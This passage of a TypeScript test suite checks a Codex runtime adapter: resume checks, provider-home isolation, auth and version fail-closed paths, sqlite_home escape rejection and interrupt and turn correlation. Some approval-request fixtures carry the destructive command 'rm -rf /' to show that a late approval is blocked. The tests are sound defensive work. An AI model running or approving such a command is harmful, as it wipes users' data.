        { provider: 'codex', sessionId: 'th_x', cwd: '/tmp/x', rotation: 0 },
        { providerHome: '/tmp/x/home' },
      ),
    ).rejects.toBeInstanceOf(ResumeError)
  })

  it('resume: response omits cwd → ResumeError (cwd must be proven, not echoed)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => threadStartResponseWithoutCwd('th_x'))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(
      runtime.resume(
        { provider: 'codex', sessionId: 'th_x', cwd: '/tmp/x', rotation: 0 },
        { providerHome: '/tmp/x/home' },
      ),
    ).rejects.toBeInstanceOf(ResumeError)
  })

  it('resume with a wrong-provider ref → ResumeError', async () => {
    const runtime = new CodexRuntime(() => new FakeTransport())
    await expect(
      runtime.resume(
        { provider: 'claude', sessionId: 'x', cwd: '/tmp/x', rotation: 0 },
        { providerHome: '/tmp/x/home' },
      ),
    ).rejects.toBeInstanceOf(ResumeError)
  })
})

describe('CodexRuntime — provider-home isolation (021)', () => {
  it('passes the launch cwd + provider home to the transport factory', async () => {
    let ctx: unknown
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1', '/work/dir'))
    const runtime = new CodexRuntime((c) => {
      ctx = c
      transport.codexHome = c.providerHome
      return transport
    })
    const handle = await runtime.start({ cwd: '/work/dir', providerHome: '/managed/proj/profile' })
    expect(ctx).toEqual({ cwd: '/work/dir', providerHome: '/managed/proj/profile' })
    await handle.close()
  })

  it('threads the same provider home into the factory on resume', async () => {
    let ctx: unknown
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_x'))
    const runtime = new CodexRuntime((c) => {
      ctx = c
      transport.codexHome = c.providerHome
      return transport
    })
    const handle = await runtime.resume(
      { provider: 'codex', sessionId: 'th_x', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/managed/proj/profile' },
    )
    expect(ctx).toEqual({ cwd: '/tmp/x', providerHome: '/managed/proj/profile' })
    await handle.close()
  })

  it('fails closed when initialize reports a codexHome that is not the profile home', async () => {
    const transport = new FakeTransport()
    transport.onRequest('initialize', () => ({
      userAgent: transport.userAgent,
      codexHome: '/some/other/home',
    }))
    transport.onRequest('thread/start', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(
      runtime.start({ cwd: '/tmp/x', providerHome: '/managed/profile' }),
    ).rejects.toThrow(/profile home/)
  })

  it('accepts a matching codexHome echoed by initialize', async () => {
    const transport = new FakeTransport()
    transport.onRequest('initialize', () => ({
      userAgent: transport.userAgent,
      codexHome: '/managed/profile',
    }))
    transport.onRequest('thread/start', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/managed/profile' })
    expect(handle.ref?.sessionId).toBe('th_1')
    await handle.close()
  })

  it('fails closed when initialize does not report a codexHome (absence rejected, 027 P1-H)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('initialize', () => ({ userAgent: transport.userAgent }))
    transport.onRequest('thread/start', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(
      runtime.start({ cwd: '/tmp/x', providerHome: '/managed/profile' }),
    ).rejects.toThrow(/codexHome/)
  })
})

describe('CodexRuntime — every launch keeps Codex’s own agents (D-014)', () => {
  it('runs the app-server with no config override', () => {
    expect(codexAppServerArgs()).toEqual(['app-server'])
  })

  it('the real factory launches exactly that argv — nothing appended at the call site', async () => {
    const root = mkdtempSync(join(tmpdir(), 'brobot2-d014-argv-'))
    try {
      const out = join(root, 'argv.json')
      const codex = process.platform === 'win32' ? join(root, 'app-server') : join(root, 'codex')
      writeFileSync(
        codex,
        `#!${process.execPath}\nrequire('node:fs').writeFileSync(${JSON.stringify(out)}, JSON.stringify(process.platform === 'win32' ? ['app-server', ...process.argv.slice(2)] : process.argv.slice(2)))\n`,
      )
      chmodSync(codex, 0o755)
      const home = join(root, 'home')
      mkdirSync(home)
      const transport = createSpawnTransportFactory(
        process.platform === 'win32' ? process.execPath : codex,
      )({ cwd: root, providerHome: home }) as {
        exited?: Promise<void>
      }
      await transport.exited
      const argv = JSON.parse(readFileSync(out, 'utf8')) as string[]
      expect(argv).toEqual(codexAppServerArgs())
      expect(argv.join(' ')).not.toContain('agents.enabled')
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('hands the transport only the folder and the home, on a fresh and a resumed launch', async () => {
    const startedContexts: CodexLaunchContext[] = []
    const startTransport = new FakeTransport()
    startTransport.onRequest('thread/start', () => okThread('th_start'))
    const started = await new CodexRuntime((context) => {
      startedContexts.push(context)
      startTransport.codexHome = context.providerHome
      return startTransport
    }).start({ cwd: '/tmp/d014/start', providerHome: '/tmp/d014/start-home' })
    expect(startedContexts).toEqual([
      { cwd: '/tmp/d014/start', providerHome: '/tmp/d014/start-home' },
    ])
    await started.close()

    const resumedContexts: CodexLaunchContext[] = []
    const resumeTransport = new FakeTransport()
    resumeTransport.onRequest('thread/resume', () => okThread('th_resume', '/tmp/d014/resume'))
    const resumed = await new CodexRuntime((context) => {
      resumedContexts.push(context)
      resumeTransport.codexHome = context.providerHome
      return resumeTransport
    }).resume(
      { provider: 'codex', sessionId: 'th_resume', cwd: '/tmp/d014/resume', rotation: 0 },
      { providerHome: '/tmp/d014/resume-home' },
    )
    expect(resumedContexts).toEqual([
      { cwd: '/tmp/d014/resume', providerHome: '/tmp/d014/resume-home' },
    ])
    await resumed.close()
  })
})

describe('CodexRuntime — auth inheritance (022)', () => {
  it('fails closed (AuthUnavailableError) at start when managed auth is unhealthy — no spawn, no fallback', async () => {
    let spawned = false
    const runtime = new CodexRuntime(
      () => {
        spawned = true
        return new FakeTransport()
      },
      () => ({ ok: false, reason: 'no managed Codex auth.json' }),
    )
    const starting = runtime.start({ cwd: '/tmp/x', providerHome: '/managed/profile' })
    await expect(starting).rejects.toBeInstanceOf(AuthUnavailableError)
    await expect(starting).rejects.not.toBeInstanceOf(CodexRefusedItsSignInError)
    expect(spawned).toBe(false)
  })

  it('proceeds when managed auth is healthy', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport), () => ({ ok: true }))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/managed/profile' })
    expect(handle.ref?.sessionId).toBe('th_1')
    await handle.close()
  })

  it('fails closed on resume when managed auth is unhealthy (AuthUnavailableError, not a silent fallback)', async () => {
    const runtime = new CodexRuntime(
      () => new FakeTransport(),
      () => ({ ok: false, reason: 'unhealthy' }),
    )
    await expect(
      runtime.resume(
        { provider: 'codex', sessionId: 'th_x', cwd: '/tmp/x', rotation: 0 },
        { providerHome: '/managed/profile' },
      ),
    ).rejects.toBeInstanceOf(AuthUnavailableError)
  })
})

describe('CodexRuntime — serverRequest/resolved retires the request (051)', () => {
  const resolved = (requestId: string | number, threadId = 'th_1') =>
    ({ threadId, requestId }) satisfies ServerRequestResolvedNotification

  it('retires the card and BLOCKS a late answer — no decision ever reaches the wire (044 P2 #1)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(70, 'item/commandExecution/requestApproval', {
      command: 'rm -rf /',
      cwd: '/tmp/x',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))

    transport.notification('serverRequest/resolved', resolved(70))
    await vi.waitFor(has(events, (e) => e.type === 'request_resolved'))
    expect(firstOfType(events, 'request_resolved').id).toBe('number:70')

    await expect(handle.respondPermission('number:70', { outcome: 'allow' })).rejects.toThrow()
    await new Promise((r) => setTimeout(r, 10))
    expect(transport.responses.filter((r) => r.id === 70)).toEqual([])

    await handle.close()
    await consumer
  })

  it('correlates by TYPE-PRESERVING id: resolving numeric 1 leaves string "1" untouched (045)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(1, 'item/commandExecution/requestApproval', { command: 'numeric' })
    transport.serverRequest('1', 'item/commandExecution/requestApproval', { command: 'string' })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(2),
    )

    transport.notification('serverRequest/resolved', resolved(1))
    await vi.waitFor(has(events, (e) => e.type === 'request_resolved'))
    expect(events.filter((e) => e.type === 'request_resolved').map((e) => e.id)).toEqual([
      'number:1',
    ])

    await expect(handle.respondPermission('number:1', { outcome: 'allow' })).rejects.toThrow()
    await handle.respondPermission('string:1', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === '1')).toBe(true))
    expect(transport.responses.filter((r) => r.id === 1)).toEqual([])

    await handle.close()
    await consumer
  })

  it('IGNORES a resolution for a different thread', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(71, 'item/commandExecution/requestApproval', { command: 'x' })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))

    transport.notification('serverRequest/resolved', resolved(71, 'th_OTHER'))
    await new Promise((r) => setTimeout(r, 15))
    expect(events.some((e) => e.type === 'request_resolved')).toBe(false)

    await handle.respondPermission('number:71', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 71)).toBe(true))
    expect(transport.responses).toContainEqual({ id: 71, result: { decision: 'accept' } })

    await handle.close()
    await consumer
  })

  it('retires a USER-INPUT request too, and is a no-op for an id we never claimed', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(72, 'item/tool/requestUserInput', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it',
      questions: [{ id: 'q', question: 'pick', options: [] }],
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))

    transport.notification('serverRequest/resolved', resolved(999))
    await new Promise((r) => setTimeout(r, 10))
    expect(events.some((e) => e.type === 'request_resolved')).toBe(false)

    transport.notification('serverRequest/resolved', resolved(72))
    await vi.waitFor(has(events, (e) => e.type === 'request_resolved'))
    await expect(
      handle.respondUserInput('number:72', { kind: 'answer', answers: { q: 'x' } }),
    ).rejects.toThrow()
    expect(transport.responses.filter((r) => r.id === 72)).toEqual([])

    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — CLI ↔ vendored-protocol version gate (043 P2-6)', () => {
  const uaFor = (version: string): string =>
    `brobot2/${version} (Mac OS 26.3.0; arm64) vscode/1.130.0 (brobot2; 0.0.0)`

  it('a matching CLI version launches normally', async () => {
    const transport = new FakeTransport()
    transport.userAgent = uaFor(CODEX_PROTOCOL_VERSION)
    transport.onRequest('thread/start', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })
    expect(handle.ref?.sessionId).toBe('th_1')
    await handle.close()
  })

  it('a DRIFTED CLI version fails the launch closed with an actionable message', async () => {
    const transport = new FakeTransport()
    const drifted = CODEX_PROTOCOL_VERSION.replace(/(\d+)$/, (patch) => String(Number(patch) + 1))
    transport.userAgent = uaFor(drifted)
    transport.onRequest('thread/start', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
      new RegExp(
        `${drifted.replace(/\./g, '\\.')}.*${CODEX_PROTOCOL_VERSION.replace(/\./g, '\\.')}`,
      ),
    )
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
      /protocol:generate|pin the CLI/,
    )
  })

  it('an initialize response with NO readable version fails closed (never assume compatibility)', async () => {
    for (const userAgent of ['', 'fake', 'no-version-here (Mac OS)']) {
      const transport = new FakeTransport()
      transport.userAgent = userAgent
      transport.onRequest('thread/start', () => okThread('th_1'))
      const runtime = new CodexRuntime(adopt(transport))
      await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
        /version not reported/,
      )
    }
  })

  it('parses the codex version from the FIRST userAgent token, not our own client version', () => {
    expect(
      codexVersionFromUserAgent(
        'brobot2/0.145.0 (Mac OS 26.3.0; arm64) vscode/1.130.0 (brobot2; 0.0.0)',
      ),
    ).toBe('0.145.0')
    expect(codexVersionFromUserAgent('probe/1.2.3-rc.1 (Linux)')).toBe('1.2.3-rc.1')
    expect(codexVersionFromUserAgent('nonsense')).toBeNull()
    expect(codexVersionFromUserAgent('')).toBeNull()
  })
})

describe('CodexRuntime — sqlite_home attested BEFORE spawn (041 P1-H)', () => {
  let home: string
  beforeEach(() => {
    home = mkdtempSync(join(tmpdir(), 'brobot-codex-prespawn-'))
  })
  afterEach(() => {
    rmSync(home, { recursive: true, force: true })
  })

  it('a redirecting sqlite_home rejects start WITHOUT ever constructing the transport (no app-server is launched)', async () => {
    writeFileSync(join(home, 'config.toml'), '"sqlite_home" = "/tmp/brobot-escape"\n')
    let spawned = false
    const runtime = new CodexRuntime(() => {
      spawned = true
      return new FakeTransport()
    })
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: home })).rejects.toBeInstanceOf(
      AuthUnavailableError,
    )
    expect(spawned).toBe(false)
  })

  it('a redirecting sqlite_home rejects resume WITHOUT constructing the transport', async () => {
    writeFileSync(join(home, 'config.toml'), 'sqlite_home = "/tmp/brobot-escape"\n')
    let spawned = false
    const runtime = new CodexRuntime(() => {
      spawned = true
      return new FakeTransport()
    })
    await expect(
      runtime.resume(
        { provider: 'codex', sessionId: 'th_x', cwd: '/tmp/x', rotation: 0 },
        { providerHome: home },
      ),
    ).rejects.toBeInstanceOf(AuthUnavailableError)
    expect(spawned).toBe(false)
  })

  it('a directly-constructed handle still fails closed — before ANY protocol traffic', async () => {
    writeFileSync(join(home, 'config.toml'), '"sqlite_home" = "/tmp/brobot-escape"\n')
    const transport = new FakeTransport()
    const handle = new CodexSessionHandle(transport, '/tmp/x', 0, home)
    await expect(handle.begin('started', undefined)).rejects.toBeInstanceOf(AuthUnavailableError)
    expect(transport.requests).toEqual([])
    await handle.close()
  })

  it('a CONTAINED sqlite_home still launches normally', async () => {
    writeFileSync(join(home, 'config.toml'), 'sqlite_home = "sub/state"\n')
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: home })
    expect(handle.ref?.sessionId).toBe('th_1')
    await handle.close()
  })
})

describe('CodexRuntime — 704 · an interrupt asked before Codex has started the turn', () => {
  const interrupts = (transport: FakeTransport): { method: string; params: unknown }[] =>
    transport.requests.filter((request) => request.method === 'turn/interrupt')

  it('🔴 asked before the turn/start RESPONSE: fired at the bind, and AGAIN when Codex says the turn started', async () => {
    const { transport, handle, consumer } = await startCodex()
    transport.deferNextTurnStart()
    await handle.send('count')
    await handle.interrupt()
    transport.settleTurnStart('tn_1')
    await vi.waitFor(() => expect(interrupts(transport)).toHaveLength(1))
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    await vi.waitFor(() => expect(interrupts(transport)).toHaveLength(2))
    expect(interrupts(transport)[1]?.params).toMatchObject({ threadId: 'th_1', turnId: 'tn_1' })
    await handle.close()
    await consumer
  })

  it('🔴 asked after the bind but before turn/started: sent at once, and again at turn/started', async () => {
    const { transport, handle, consumer } = await startCodex()
    await handle.send('count')
    await vi.waitFor(() => expect(transport.turnStartIds).toEqual(['tn_1']))
    await handle.interrupt()
    await vi.waitFor(() => expect(interrupts(transport)).toHaveLength(1))
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    await vi.waitFor(() => expect(interrupts(transport)).toHaveLength(2))
    expect(interrupts(transport)[1]?.params).toMatchObject({ threadId: 'th_1', turnId: 'tn_1' })
    await handle.close()
    await consumer
  })

  it('⚑ controls: asked AFTER turn/started is sent once; a turn/started nobody interrupted sends none', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('one')
    await vi.waitFor(() => expect(transport.turnStartIds).toEqual(['tn_1']))
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(interrupts(transport)).toHaveLength(0)
    await handle.interrupt()
    await vi.waitFor(() => expect(interrupts(transport)).toHaveLength(1))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1', { status: 'interrupted' })),
    )
    await vi.waitFor(() => expect(events.filter((event) => event.type === 'turn')).toHaveLength(1))
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(interrupts(transport)).toHaveLength(1)
    await handle.close()
    await consumer
  })

  it('⛔ the next turn is never interrupted by the last one’s ask — a turn/started for another turn sends nothing', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('one')
    await vi.waitFor(() => expect(transport.turnStartIds).toEqual(['tn_1']))
    await handle.interrupt()
    await vi.waitFor(() => expect(interrupts(transport)).toHaveLength(1))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1', { status: 'interrupted' })),
    )
    await vi.waitFor(() => expect(events.filter((event) => event.type === 'turn')).toHaveLength(1))
    await vi.waitFor(() => expect(handle.status()).toBe('idle'))
    await handle.send('two')
    await vi.waitFor(() => expect(transport.turnStartIds).toEqual(['tn_1', 'tn_2']))
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_2'))
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(interrupts(transport)).toHaveLength(1)
    await handle.interrupt()
    await vi.waitFor(() => expect(interrupts(transport)).toHaveLength(2))
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(interrupts(transport).map((request) => request.params)).toEqual([
      expect.objectContaining({ turnId: 'tn_1' }),
      expect.objectContaining({ turnId: 'tn_2' }),
    ])
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_2'))
    await vi.waitFor(() => expect(interrupts(transport)).toHaveLength(3))
    expect(interrupts(transport)[2]?.params).toMatchObject({ turnId: 'tn_2' })
    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — turn correlation (037/029 P1-C: bound from the turn/start RESPONSE)', () => {
  it('an interrupt() BEFORE the turn/start RESPONSE is latched and fired once the response binds the provider turnId; terminal is interrupted', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    transport.deferNextTurnStart()
    await handle.send('go')
    await handle.interrupt()
    expect(transport.requests.some((r) => r.method === 'turn/interrupt')).toBe(false)

    transport.settleTurnStart('tn_1')
    await vi.waitFor(() =>
      expect(transport.requests.some((r) => r.method === 'turn/interrupt')).toBe(true),
    )
    expect(transport.requests.find((r) => r.method === 'turn/interrupt')?.params).toMatchObject({
      turnId: 'tn_1',
    })

    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1', { status: 'interrupted' })),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'interrupted'))
    await handle.close()
    await consumer
  })

  it('🔴 709 · R43 — …and an early interrupt Codex COMPLETED anyway is recorded `completed`, the ask notwithstanding', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    transport.deferNextTurnStart()
    await handle.send('go')
    await handle.interrupt()
    transport.settleTurnStart('tn_1')
    await vi.waitFor(() =>
      expect(transport.requests.some((r) => r.method === 'turn/interrupt')).toBe(true),
    )
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn'))
    expect(
      events.filter((e) => e.type === 'turn').map((e) => (e.type === 'turn' ? e.state : '')),
    ).toEqual(['completed'])
    await handle.close()
    await consumer
  })

  it('a delayed duplicate turn/started + stale turn/completed for an OLD provider turn cannot rebind or terminalize the current turn (036 P1-C repro)', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('one')
    expect(transport.turnStartIds).toEqual(['tn_1'])
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(() => expect(events.filter((e) => e.type === 'turn').length).toBe(1))

    await handle.send('two')
    expect(transport.turnStartIds).toEqual(['tn_1', 'tn_2'])
    await vi.waitFor(() => expect(handle.status()).toBe('working'))

    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await new Promise((r) => setTimeout(r, 25))
    expect(events.filter((e) => e.type === 'turn')).toHaveLength(1)
    expect(handle.status()).toBe('working')

    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_2')),
    )
    await vi.waitFor(() => expect(events.filter((e) => e.type === 'turn').length).toBe(2))
    await handle.close()
    await consumer
  })

  it('a stale turn-scoped delta/item for an OLD provider turn is ignored (validated against the response-bound id)', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('one')
    expect(transport.turnStartIds).toEqual(['tn_1'])
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(() => expect(events.filter((e) => e.type === 'turn').length).toBe(1))

    await handle.send('two')
    expect(transport.turnStartIds).toEqual(['tn_1', 'tn_2'])
    transport.notification('item/agentMessage/delta', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'm',
      delta: 'STALE',
    })
    transport.notification('item/agentMessage/delta', {
      threadId: 'th_1',
      turnId: 'tn_2',
      itemId: 'm',
      delta: 'FRESH',
    })
    await vi.waitFor(() =>
      expect(events.some((e) => e.type === 'assistant_delta' && e.text === 'FRESH')).toBe(true),
    )
    expect(events.some((e) => e.type === 'assistant_delta' && e.text === 'STALE')).toBe(false)
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_2')),
    )
    await handle.close()
    await consumer
  })

  const staleLeak = (arrivals: RuntimeEvent[]): boolean =>
    arrivals.some((e) => JSON.stringify(e).includes('STALE'))
  const thinkingLeak = (arrivals: RuntimeEvent[]): boolean =>
    arrivals.some((e) => e.type === 'thinking')
  const planLeak = (arrivals: RuntimeEvent[]): boolean =>
    arrivals.some((e) => e.type === 'plan_update')
  const subAgentLeak = (arrivals: RuntimeEvent[]): boolean =>
    arrivals.some((e) => e.type === 'sub_agent')

  it.each([
    [
      'item/reasoning/summaryTextDelta',
      { itemId: 'rs_1', summaryIndex: 0, delta: 'STALE' },
      (a: RuntimeEvent[]) => staleLeak(a) || thinkingLeak(a),
    ],
    ['item/reasoning/summaryPartAdded', { itemId: 'rs_1', summaryIndex: 1 }, thinkingLeak],
    [
      'turn/plan/updated',
      { explanation: null, plan: [{ step: 'STALE', status: 'completed' }] },
      (a: RuntimeEvent[]) => staleLeak(a) || planLeak(a),
    ],
    ['item/commandExecution/outputDelta', { itemId: 'exec_1', delta: 'STALE\n' }, staleLeak],
    [
      'item/fileChange/patchUpdated',
      { itemId: 'exec_1', changes: [{ path: '/w/STALE.txt', kind: { type: 'add' } }] },
      staleLeak,
    ],
    [
      'thread/tokenUsage/updated',
      { marker: 'STALE', tokenUsage: { total: { totalTokens: 1 } } },
      staleLeak,
    ],
    [
      'item/started',
      {
        item: {
          type: 'subAgentActivity',
          id: 'call_STALE',
          kind: 'started',
          agentThreadId: 'STALE-child-thread',
          agentPath: '/root/stale',
        },
      },
      (a: RuntimeEvent[]) => staleLeak(a) || subAgentLeak(a),
    ],
  ])(
    'a stale-turn %s is IGNORED, not applied to the current turn (027 gating)',
    async (method, extra, leaked) => {
      const { transport, handle, events, consumer } = await startCodex()
      await handle.send('one')
      transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
      transport.notification(
        'turn/completed',
        turnCompletedNotification('th_1', completedTurn('tn_1')),
      )
      await vi.waitFor(() => expect(events.filter((e) => e.type === 'turn').length).toBe(1))

      const before = events.length
      await handle.send('two')
      transport.notification(method, { threadId: 'th_1', turnId: 'tn_1', ...extra })
      await new Promise((resolve) => setTimeout(resolve, 30))

      const arrivals = events.slice(before)
      expect(leaked(arrivals), `${method} from a finished turn leaked into the live one`).toBe(
        false,
      )

      transport.notification(
        'turn/completed',
        turnCompletedNotification('th_1', completedTurn('tn_2')),
      )
      await handle.close()
      await consumer
    },
  )

  it('thread/status/changed is DELIBERATELY not turn-gated — it has no turn to gate on', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    const before = events.length
    transport.notification('thread/status/changed', {
      threadId: 'th_1',
      status: { type: 'active', activeFlags: ['waitingOnApproval'] },
    })
    await vi.waitFor(() => expect(events.length).toBeGreaterThan(before))
    const arrivals = events.slice(before)
    expect(arrivals.some((e) => e.type === 'activity')).toBe(false)
    await handle.close()
    await consumer
  })

  it('a malformed turn/start response (no turn id) is a provider protocol error → fails closed (errored), never proceeds uncorrelated (036 P1-C)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    transport.onRequest('turn/start', () => malformedTurnStartResponse)
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    await handle.send('go')
    await vi.waitFor(has(events, (e) => e.type === 'error' && e.fatal === true))
    expect(events.some((e) => e.type === 'status' && e.state === 'errored')).toBe(true)
    expect(events.some((e) => e.type === 'turn')).toBe(true)
    await handle.close()
    await consumer
  })
})

describe('395 · telling a Codex interruption from a Codex fault', () => {
  it('🔴 the discriminator is the NEIGHBOURS, not the turn — an interrupt emits no `error`', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('go')
    await handle.interrupt()
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1', { status: 'interrupted' })),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'interrupted'))
    expect(events.some((e) => e.type === 'error')).toBe(false)
    expect(events.filter((e) => e.type === 'status').at(-1)).toMatchObject({ state: 'idle' })
    await handle.close()
    await consumer
  })

  it('⛔ …and a FAULT on the same turn emits a fatal `error` and ends `errored`', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('go')
    transport.endIncoming()
    await consumer
    const errors = events.filter((e) => e.type === 'error')
    expect(errors).toHaveLength(1)
    expect(errors[0]).toMatchObject({ fatal: true })
    expect(events.some((e) => e.type === 'status' && e.state === 'errored')).toBe(true)
    expect(
      events.filter((e) => e.type === 'turn').map((e) => (e.type === 'turn' ? e.state : '')),
    ).toEqual(['failed'])
    await handle.close()
  })

  it('⚑ 709 · a card CANCELLED, then the stream ends — the machine’s own word after the ask, beside the fault', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(64, 'item/commandExecution/requestApproval', {
      command: 'rm -rf build',
      cwd: '/tmp/x',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:64', { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 64)).toBe(true))
    transport.endIncoming()
    await consumer
    expect(events.filter((e) => e.type === 'error')).toMatchObject([{ fatal: true }])
    expect(
      events.filter((e) => e.type === 'turn').map((e) => (e.type === 'turn' ? e.state : '')),
    ).toEqual(['interrupted'])
    await handle.close()
  })

  it('⚑ 709 · …and the control one fact over: the same card answered DENY, then the stream ends, is the fault alone', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(64, 'item/commandExecution/requestApproval', {
      command: 'rm -rf build',
      cwd: '/tmp/x',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:64', { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 64)).toBe(true))
    transport.endIncoming()
    await consumer
    expect(events.filter((e) => e.type === 'error')).toMatchObject([{ fatal: true }])
    expect(
      events.filter((e) => e.type === 'turn').map((e) => (e.type === 'turn' ? e.state : '')),
    ).toEqual(['failed'])
    await handle.close()
  })

  it('🔴 IN KIND: Codex does NOT force a local terminal — it fires the RPC and waits', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('go')
    await handle.interrupt()
    expect(transport.requests.find((r) => r.method === 'turn/interrupt')?.params).toMatchObject({
      turnId: 'tn_1',
    })
    expect(events.some((e) => e.type === 'turn')).toBe(false)
    expect(handle.status()).toBe('working')
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1', { status: 'interrupted' })),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'interrupted'))
    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — close/fatal barrier (028 P1-A)', () => {
  it('a fatal stream loss reaps the transport from the errored state; a later close() still completes', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    expect(transport.closeCount).toBe(0)
    transport.endIncoming()
    await consumer
    expect(events.some((e) => e.type === 'status' && e.state === 'errored')).toBe(true)
    expect(transport.closeCount).toBeGreaterThan(0)
    await handle.close()
  })

  it('a tracked handler that throws "write after terminal" does not surface an unhandled rejection', async () => {
    const rejections: unknown[] = []
    const onRej = (reason: unknown): void => {
      rejections.push(reason)
    }
    process.on('unhandledRejection', onRej)
    try {
      const transport = new FakeTransport()
      transport.onRequest('thread/start', () => okThread('th_1'))
      const runtime = new CodexRuntime(adopt(transport))
      const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })
      const events: RuntimeEvent[] = []
      const consumer = collect(handle, events)
      await handle.send('go')
      transport.serverRequest(90, 'item/commandExecution/requestApproval', { command: 'x' })
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      transport.throwOnRespond = true
      await handle.close()
      await consumer
      await new Promise((r) => setTimeout(r, 40))
